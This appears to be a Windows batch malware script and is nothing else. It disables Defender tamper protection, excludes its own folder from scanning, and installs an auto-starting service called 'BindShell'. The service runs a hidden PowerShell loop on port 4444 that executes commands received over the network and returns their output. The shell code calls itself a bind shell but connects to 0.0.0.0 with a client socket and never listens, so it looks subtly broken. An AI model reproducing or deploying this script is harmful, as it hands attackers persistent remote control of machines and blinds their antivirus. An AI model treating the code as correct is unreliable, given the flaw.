@echo off
sc delete BindShell>nul 2>&1
powershell -c "Set-MpPreference -DisableTamperProtection $true -ea 0;Add-MpPreference -ExclusionPath '%~dp0' -ea 0">nul 2>&1
sc create BindShell binpath= "powershell -w h -c \"while(1){try{$c=New-Object system.Net.Sockets.TCPClient('0.0.0.0',4444);$s=$c.GetStream();[byte[]]$b=0..5KB+1|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String );$sb2=$sb+'PS '+(pwd)+'> ';$sbt=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()}catch{sleep 3}}\"" start= auto
sc start BindShell
